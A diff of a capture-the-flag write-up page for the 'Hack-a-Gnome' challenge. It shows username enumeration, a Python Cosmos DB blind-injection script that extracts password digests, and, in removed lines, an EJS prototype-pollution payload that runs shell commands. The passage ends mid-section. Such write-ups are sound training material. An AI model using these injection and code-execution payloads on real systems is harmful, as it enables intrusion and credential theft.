@@ -38,31 +38,31 @@ I enjoy open source projects and amateur robotics.
 Hiking and kayaking are my favorite IRL activies.
 I love single player video games with great stoylines.
 Hey, I could really use another set of eyes on this gnome takeover situation.">
-    <meta itemprop="datePublished" content="2025-11-30T11:47:39+01:00">
-    <meta itemprop="dateModified" content="2025-11-30T11:47:39+01:00">
-    <meta itemprop="wordCount" content="2925">
+    <meta itemprop="datePublished" content="2025-12-12T11:47:39+01:00">
+    <meta itemprop="dateModified" content="2025-12-12T11:47:39+01:00">
+    <meta itemprop="wordCount" content="1861">
     <title>Hack-a-Gnome :: SANS Holiday Hack Challenge 2025</title>
     <link href="/act3/hack-a-gnome/index.xml" rel="alternate" type="application/rss+xml" title="Hack-a-Gnome :: SANS Holiday Hack Challenge 2025">
-    <link href="/css/auto-complete/auto-complete.min.css?1765551208" rel="stylesheet">
-    <script src="/js/auto-complete/auto-complete.min.js?1765551208" defer></script>
-    <script src="/js/search-lunr.js?1765551208" defer></script>
-    <script src="/js/search.js?1765551208" defer></script>
+    <link href="/css/auto-complete/auto-complete.min.css?1765552249" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1765552249" defer></script>
+    <script src="/js/search-lunr.js?1765552249" defer></script>
+    <script src="/js/search.js?1765552249" defer></script>
     <script>
       window.relearn = window.relearn || {};
-      window.relearn.index_js_url="/searchindex.en.js?1765551208";
+      window.relearn.index_js_url="/searchindex.en.js?1765552249";
     </script>
-    <script src="/js/lunr/lunr.min.js?1765551208" defer></script>
-    <script src="/js/lunr/lunr.stemmer.support.min.js?1765551208" defer></script>
-    <script src="/js/lunr/lunr.multi.min.js?1765551208" defer></script>
-    <script src="/js/lunr/lunr.en.min.js?1765551208" defer></script>
+    <script src="/js/lunr/lunr.min.js?1765552249" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1765552249" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1765552249" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1765552249" defer></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.contentLangs=['en'];
     </script>
-    <link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765551208" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765551208" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1765551208" rel="stylesheet">
-    <link href="/css/theme.css?1765551208" rel="stylesheet">
-    <link href="/css/format-html.css?1765551208" rel="stylesheet" id="R-format-style">
+    <link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765552249" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765552249" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1765552249" rel="stylesheet">
+    <link href="/css/theme.css?1765552249" rel="stylesheet">
+    <link href="/css/format-html.css?1765552249" rel="stylesheet" id="R-format-style">
     <script>
       window.relearn = window.relearn || {};
       // configuration
@@ -138,17 +138,23 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
     <li><a href="#solution">Solution</a>
       <ul>
         <li><a href="#getting-access-to-the-control-panel">Getting access to the control panel</a></li>
+        <li><a href="#identifying-the-database">Identifying the database</a></li>
+        <li><a href="#enumerating-users">Enumerating users</a></li>
+        <li><a href="#enumerating-the-database">Enumerating the database</a></li>
+        <li><a href="#cosmos-db-enumeration-using-python">Cosmos DB enumeration using Python</a></li>
+        <li><a href="#extracting-and-cracking-password-digests">Extracting and cracking password digests</a></li>
         <li><a href="#exploiting-the-control-panel">Exploiting the control panel</a></li>
+        <li><a href="#identifying-the-exploitable-vector">Identifying the exploitable vector</a></li>
+        <li><a href="#confirming-prototype-pollution">Confirming prototype pollution</a></li>
+        <li><a href="#weaponizing-the-vulnerability">Weaponizing the vulnerability</a></li>
         <li><a href="#operating-the-reverse-shell">Operating the reverse shell</a></li>
-        <li><a href="#enumerating-control-codes">Enumerating control codes</a></li>
+        <li><a href="#enumerating-can-bus-control-codes">Enumerating CAN bus control codes</a></li>
+        <li><a href="#final-control-mapping-and-solution">Final control mapping and solution</a></li>
       </ul>
     </li>
+    <li><a href="#chris-davis-mission-debrief">Chris Davis mission debrief</a></li>
+    <li><a href="#hints">Hints</a></li>
     <li><a href="#resources">Resources</a></li>
-    <li><a href="#chris-davis-mission-debrief">Chris Davis mission debrief</a>
-      <ul>
-        <li><a href="#hints">Hints</a></li>
-      </ul>
-    </li>
   </ul>
 </nav>
                 </div>
@@ -185,8 +191,8 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
 
 <h1 id="hack-a-gnome">Hack-a-Gnome</h1>
 
-<p><a href="#R-image-eb0de369718ac2b7f005f7b53764c4ba" class="lightbox-link"><img alt="Chris Daves" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/chrisdavis-avatar.gif" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-eb0de369718ac2b7f005f7b53764c4ba"><img alt="Chris Daves" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/chrisdavis-avatar.gif"></a></p>
+<p><a href="#R-image-b44ff326486ee45e4e2e56963e7b2c7f" class="lightbox-link"><img alt="Chris Daves" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/chrisdavis-avatar.gif" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-b44ff326486ee45e4e2e56963e7b2c7f"><img alt="Chris Daves" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/chrisdavis-avatar.gif"></a></p>
 <h2 id="objective">Objective</h2>
 <table>
   <thead>
@@ -218,10 +224,14 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
 </blockquote>
 <h2 id="solution">Solution</h2>
 <h3 id="getting-access-to-the-control-panel">Getting access to the control panel</h3>
-<p>When opening the URL <a href="https://hhc25-smartgnomehack-prod.holidayhackchallenge.com" rel="external">https://hhc25-smartgnomehack-prod.holidayhackchallenge.com</a> we are presented with the following landing page:</p>
-<p><a href="#R-image-dd85b9186a089c656b89332fd4e37539" class="lightbox-link"><img alt="First landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-6.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-dd85b9186a089c656b89332fd4e37539"><img alt="First landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-6.png"></a></p>
-<p>By inspecting the HTML source of the mainpage we found an interesting Javascript file, <code>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/static/script.js</code>. By reading it we got to know a few interesting endpoints:</p>
+<p>When opening the URL:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com</code></pre></div>
+<p>I am presented with the following landing page:</p>
+<p><a href="#R-image-fe2d7626336fb8468dac1866dfbc8ee0" class="lightbox-link"><img alt="First landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-6.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-fe2d7626336fb8468dac1866dfbc8ee0"><img alt="First landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-6.png"></a></p>
+<p>By inspecting the HTML source and the JavaScript loaded by the main page, I identified an interesting file:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/static/script.js</code></pre></div>
+<p>Reviewing this file revealed the following backend endpoints used by the application:</p>
 <table>
   <thead>
       <tr>
@@ -231,39 +241,50 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
   </thead>
   <tbody>
       <tr>
-          <td>/register</td>
+          <td><code>/register</code></td>
           <td>Endpoint for registering a new user</td>
       </tr>
       <tr>
-          <td>/userAvailable?username=</td>
-          <td>In use to check wheter a username is available for registion upon creating a new user</td>
+          <td><code>/userAvailable?username=</code></td>
+          <td>Endpoint used to check whether a username is available during registration</td>
       </tr>
   </tbody>
 </table>
-<h4 id="identifying-the-database">Identifying the database</h4>
-<p>We identified the endpoints above, and the only endpoint taking arguments seems to be the <code>userAvailable</code> one. We were able to provoke an error message by sending in an <code>&quot;</code> to the this endpoint like so:</p>
+<p>Of these, <code>/userAvailable</code> is the only endpoint that accepts user-controlled input without authentication, making it a natural starting point.</p>
+<hr>
+<h3 id="identifying-the-database">Identifying the database</h3>
+<p>To understand how the backend processes input, I attempted to provoke an error by submitting an unexpected character to the <code>userAvailable</code> endpoint:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span></span></span></code></pre></div>
-<p>This resulted in the following error:</p>
+<p>This resulted in the following error message:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;error&#34;</span>:<span style="color:#e6db74">&#34;An error occurred while checking username: Message: {\&#34;errors\&#34;:[{\&#34;severity\&#34;:\&#34;Error\&#34;,\&#34;location\&#34;:{\&#34;start\&#34;:44,\&#34;end\&#34;:45},\&#34;code\&#34;:\&#34;SC1012\&#34;,\&#34;message\&#34;:\&#34;Syntax error, invalid string literal token &#39;\\\&#34;&#39;.\&#34;}]}\r\nActivityId: fc87623e-4f9b-4d3d-9b18-f56fefa1b5d9, Microsoft.Azure.Documents.Common/2.14.0&#34;</span>}</span></span></code></pre></div>
-<p>After a quick check using ChatGPT, it appears we are dealing with <em>Cosmos DB</em> here.</p>
-<h4 id="enumerating-users">Enumerating users</h4>
-<p>From the hints we are now to enumerate the users in the database. This seemed straight forward using <em>FFUF</em> with a list of common names:</p>
-<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username<span style="color:#f92672">=</span>FUZZ -X GET -fr <span style="color:#e6db74">&#34;true&#34;</span></span></span></code></pre></div>
-<p>The feedback from the server basically states <em>available: true or false</em>, thus we easily added the <code>-fr</code> option find users not available. We quickly identify the following users:</p>
+<p>The presence of <code>Microsoft.Azure.Documents.Common</code> in the error output indicates that the backend database is <strong>Azure Cosmos DB (SQL API)</strong>.</p>
+<hr>
+<h3 id="enumerating-users">Enumerating users</h3>
+<p>Based on the challenge hints, the next step was to enumerate users stored in the database. The endpoint returns a boolean value (<code>available: true</code> or <code>false</code>), which makes it well suited for brute-force enumeration.</p>
+<p>I used <strong>ffuf</strong> with a list of common names:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username<span style="color:#f92672">=</span>FUZZ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-X GET -fr <span style="color:#e6db74">&#34;true&#34;</span></span></span></code></pre></div>
+<p>By filtering out responses containing <code>&quot;true&quot;</code>, I identified usernames that already exist in the database.</p>
+<p>The following valid users were discovered:</p>
 <ul>
-<li>bruce</li>
-<li>harold</li>
+<li><code>bruce</code></li>
+<li><code>harold</code></li>
 </ul>
-<h4 id="enumerating-the-database">Enumerating the database</h4>
-<p>We don&rsquo;t know Cosmos DB at all. But from looking at syntax examples online, every example seems to go like this:</p>
+<hr>
+<h3 id="enumerating-the-database">Enumerating the database</h3>
+<p>At this stage, I knew the backend was Cosmos DB, but had no prior experience working with its query syntax. From reviewing examples online, Cosmos DB SQL queries typically follow this pattern:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> p <span style="color:#66d9ef">WHERE</span> p.something <span style="color:#f92672">=</span> something</span></span></code></pre></div>
-<p>From this we formed the following workflow:</p>
+<p>From this, I established the following workflow:</p>
 <ol>
-<li>Identify &ldquo;p&rdquo; - what value could be in use here?</li>
-<li>Identify fields in use, Cosmos DB doesn&rsquo;t have a set schema</li>
-<li>Extract password, if even possible</li>
+<li>Identify the document alias (<code>p</code> in the example)</li>
+<li>Identify which fields exist in the document (Cosmos DB is schemaless)</li>
+<li>Determine whether credential material can be extracted</li>
 </ol>
-<p>For this excercise we decided to leave FFUF for now an move on to Python, since that is where we work the most:</p>
+<p>For this phase, I decided to leave ffuf and move to Python, as it allowed me to implement more controlled logic for blind enumeration.</p>
+<hr>
+<h3 id="cosmos-db-enumeration-using-python">Cosmos DB enumeration using Python</h3>
+<p>The following Python script was used to interact with the <code>userAvailable</code> endpoint and perform boolean-based enumeration against Cosmos DB.</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
@@ -291,7 +312,7 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
 </span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> inject(base_url, payload)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">in</span> result<span style="color:#f92672">.</span>keys():
-</span></span><span style="display:flex;"><span>        	<span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        prefix_letter <span style="color:#f92672">=</span> prefix
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
@@ -302,20 +323,20 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Find password field name</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_password_field</span>(url, username, prefix):
-</span></span><span style="display:flex;"><span>	fields <span style="color:#f92672">=</span> []
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;burp-parameter-names.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f<span style="color:#f92672">.</span>readlines():
-</span></span><span style="display:flex;"><span>			needle <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>			payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; AND IS_DEFINED(</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{</span>needle<span style="color:#e6db74">}</span><span style="color:#e6db74">) --&#39;</span>
-</span></span><span style="display:flex;"><span>			result <span style="color:#f92672">=</span> inject(url, payload)
+</span></span><span style="display:flex;"><span>    fields <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;burp-parameter-names.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f<span style="color:#f92672">.</span>readlines():
+</span></span><span style="display:flex;"><span>            needle <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; AND IS_DEFINED(</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{</span>needle<span style="color:#e6db74">}</span><span style="color:#e6db74">) --&#39;</span>
+</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> inject(url, payload)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">in</span> result<span style="color:#f92672">.</span>keys():
-</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">in</span> result<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> result<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;available&#34;</span>) <span style="color:#f92672">is</span> <span style="color:#66d9ef">False</span>:
-</span></span><span style="display:flex;"><span>				fields<span style="color:#f92672">.</span>append(needle)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> result<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;available&#34;</span>) <span style="color:#f92672">is</span> <span style="color:#66d9ef">False</span>:
+</span></span><span style="display:flex;"><span>                fields<span style="color:#f92672">.</span>append(needle)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> fields
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> fields
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Find digest</span>
@@ -349,7 +370,8 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>find_digest(base_url, prefix, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;harold&#34;</span>)
 </span></span><span style="display:flex;"><span>find_digest(base_url, prefix, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;bruce&#34;</span>)</span></span></code></pre></div>
-<p>From running this script we learn that the <code>p</code> we were looking for was actually <code>c</code>. Furhter we identified the following document fields:</p>
+<p>Running this script revealed that the document alias used in backend queries is <code>c</code>.</p>
+<p>The following document fields were identified:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ID
 </span></span><span style="display:flex;"><span>Id
 </span></span><span style="display:flex;"><span>USERNAME
@@ -359,7 +381,11 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
 </span></span><span style="display:flex;"><span>id
 </span></span><span style="display:flex;"><span>userName
 </span></span><span style="display:flex;"><span>username</span></span></code></pre></div>
-<p>There are no &ldquo;password&rdquo; field, however we identified a <code>digest</code> field, which kinda is the same thing. Moving on we bruteforced the <code>digest</code> field for the two users we have found, and this is what we got:</p>
+<p>There is no plaintext password field; however, a <code>digest</code> field is present and appears to store a password hash.</p>
+<hr>
+<h3 id="extracting-and-cracking-password-digests">Extracting and cracking password digests</h3>
+<p>Using the same script, I brute-forced the <code>digest</code> field for both users using the <code>STARTSWITH()</code> function to extract the value character by character.</p>
+<p>This resulted in the following hashes:</p>
 <table>
   <thead>
       <tr>
@@ -381,12 +407,13 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
       </tr>
   </tbody>
 </table>
-<p>The digest (passwords) were stored as MD5 - by simply visiting <a href="https://crackstation.net" rel="external">Crackstation</a> we decoded them easily</p>
+<p>The digests were identified as MD5 hashes and cracked using <strong>CrackStation</strong>.</p>
+<hr>
 <h3 id="exploiting-the-control-panel">Exploiting the control panel</h3>
-<p>Upon logging in to the control panel we are presented with this landingpage:</p>
-<p><a href="#R-image-8e8ddcdcff818055923615855cae9e4e" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-1.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-8e8ddcdcff818055923615855cae9e4e"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-1.png"></a></p>
-<p>From inspecting the HTML source code and Javascript code we find the following endpoints:</p>
+<p>After logging in using the recovered credentials, I am presented with the control panel landing page:</p>
+<p><a href="#R-image-bf7b4e7785d49613d8e5a6b864deaac8" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-1.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-bf7b4e7785d49613d8e5a6b864deaac8"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-1.png"></a></p>
+<p>Inspecting the HTML and JavaScript revealed the following internal endpoints:</p>
 <table>
   <thead>
       <tr>
@@ -396,83 +423,46 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
   </thead>
   <tbody>
       <tr>
-          <td>/home</td>
-          <td>Mainpage, contains two iframes, one for <em>Smart Gnome Statistics</em> panel and <em>Gnome Control Interface</em></td>
+          <td><code>/home</code></td>
+          <td>Main page containing two iframes</td>
       </tr>
       <tr>
-          <td>/stats</td>
-          <td><em>Smart Gnome Statistics</em> panel</td>
+          <td><code>/stats</code></td>
+          <td>Smart Gnome Statistics panel</td>
       </tr>
       <tr>
-          <td>/control</td>
-          <td><em>Gnome Control Interface</em> - where the robot game plays out</td>
+          <td><code>/control</code></td>
+          <td>Gnome Control Interface</td>
       </tr>
       <tr>
-          <td>/register</td>
-          <td>Endpoint for registering a new user</td>
-      </tr>
-      <tr>
-          <td>/ctrlsignals?message=</td>
-          <td>This is used to communicate with backend, for instance updating the robot name. Takes an urlencoded JSON object as input to &lsquo;message&rsquo; argument</td>
+          <td><code>/ctrlsignals?message=</code></td>
+          <td>Backend endpoint for updating control parameters</td>
       </tr>
   </tbody>
 </table>
-<h4 id="finding-exploitable-vector">Finding exploitable vector</h4>
-<p>From the endpoints we see that there is just one endpoint taking any form of input, <em>/ctrlsignals</em>. We know from the hints that we are facing prototype poisoning, and this endpoint seems to fit the bill. So lets toy some further.</p>
-<p>By sending a single <em>&rsquo;</em> we can make the system fail at parsing the input:</p>
-<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>SyntaxError: Unexpected token &#39; in JSON at position 0    at JSON.parse (&lt;anonymous&gt;)    at /app/server.js:121:33    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)    at next (/app/node_modules/express/lib/router/route.js:149:13)    at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3)    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)    at /app/node_modules/express/lib/router/index.js:284:15    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)    at next (/app/node_modules/express/lib/router/index.js:280:10)    at /app/server.js:49:9</code></pre></div>
-<p>Provoking error message to confirm <em>__proto__</em> vulnerability in EJS templating system;</p>
-<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;action&#34;</span>:<span style="color:#e6db74">&#34;update&#34;</span>,<span style="color:#e6db74">&#34;key&#34;</span>:<span style="color:#e6db74">&#34;__proto__&#34;</span>,<span style="color:#e6db74">&#34;subkey&#34;</span>:<span style="color:#e6db74">&#34;toString&#34;</span>,<span style="color:#e6db74">&#34;value&#34;</span>:<span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">}</span></span></span></code></pre></div>
-<p>This had to be sent as URL-encoded value:</p>
-<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message<span style="color:#f92672">=</span>%7B%22action%22:%22update%22,%22key%22:%22__proto__%22,%22subkey%22:%22toString%22,%22value%22:%22a%22%7D</span></span></code></pre></div>
-<p>By refreshing the landing page we got the following error:</p>
-<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>TypeError: Object.prototype.toString.call is not a function
-    at Object.isRegExp (/app/node_modules/qs/lib/utils.js:231:38)
-    at normalizeParseOptions (/app/node_modules/qs/lib/parse.js:289:64)
-    at module.exports [as parse] (/app/node_modules/qs/lib/parse.js:305:19)
-    at parseExtendedQueryString (/app/node_modules/express/lib/utils.js:289:13)
-    at query (/app/node_modules/express/lib/middleware/query.js:42:19)
-    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
-    at trim_prefix (/app/node_modules/express/lib/router/index.js:328:13)
-    at /app/node_modules/express/lib/router/index.js:286:9
-    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)
-    at next (/app/node_modules/express/lib/router/index.js:280:10)</code></pre></div>
-<p>Furter, the following payload triggers more errors:</p>
-<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>{
-	&#34;action&#34;: &#34;update&#34;,
-	&#34;key&#34;:&#34;__proto__&#34;,
-	&#34;subkey&#34;: &#34;escapeFn&#34;,
-	&#34;value&#34;:&#34;{\&#34;view options\&#34;: {\&#34;client\&#34;: 1, \&#34;escapeFn\&#34;: \&#34;process.mainModule.require(&#39;child_process&#39;).exec(&#39;ls&#39;, (_, stdout, stderr) =&gt; console.log(stdout || stderr));\&#34;}}&#34;
-}</code></pre></div>
-<p>Error triggered:</p>
-<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>TypeError: /app/views/stats.ejs:70
-    68|                 &lt;% gnomeStats.forEach(stat =&gt; { %&gt;
-    69|                     &lt;tr&gt;
- &gt;&gt; 70|                         &lt;td class=&#34;key-cell&#34;&gt;&lt;%= stat.name %&gt;&lt;/td&gt;
-    71|                         &lt;td class=&#34;value-cell&#34;&gt;&lt;%= stat.value %&gt;&lt;/td&gt;
-    72|                     &lt;/tr&gt;
-    73|                 &lt;% }); %&gt;
-
-escapeFn is not a function
-    at eval (/app/views/stats.ejs:15:16)
-    at Array.forEach (&lt;anonymous&gt;)
-    at eval (/app/views/stats.ejs:12:19)
-    at stats (/app/node_modules/ejs/lib/ejs.js:691:17)
-    at tryHandleCache (/app/node_modules/ejs/lib/ejs.js:272:36)
-    at exports.renderFile [as engine] (/app/node_modules/ejs/lib/ejs.js:489:10)
-    at View.render (/app/node_modules/express/lib/view.js:135:8)
-    at tryRender (/app/node_modules/express/lib/application.js:657:10)
-    at Function.render (/app/node_modules/express/lib/application.js:609:3)
-    at ServerResponse.render (/app/node_modules/express/lib/response.js:1049:7)</code></pre></div>
-<h4 id="web-application">Web application</h4>
-<p>In order to craft a payload we turned to Python for development, as fiddling with the browser quickly became cumbersome. The following Python script is provided as is. It functions as thus:</p>
+<p>The <code>/ctrlsignals</code> endpoint is the only endpoint that accepts structured user input.</p>
+<hr>
+<h3 id="identifying-the-exploitable-vector">Identifying the exploitable vector</h3>
+<p>Knowing from the challenge hints that prototype pollution was likely involved, I focused on the <code>/ctrlsignals</code> endpoint.</p>
+<p>Submitting malformed input (a single <code>'</code>) caused a JSON parsing error:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>SyntaxError: Unexpected token &#39; in JSON at position 0</code></pre></div>
+<p>The stack trace references Express.js and EJS, indicating that user-supplied JSON is later rendered in an EJS template.</p>
+<hr>
+<h3 id="confirming-prototype-pollution">Confirming prototype pollution</h3>
+<p>To test for prototype pollution, I submitted the following payload:</p>
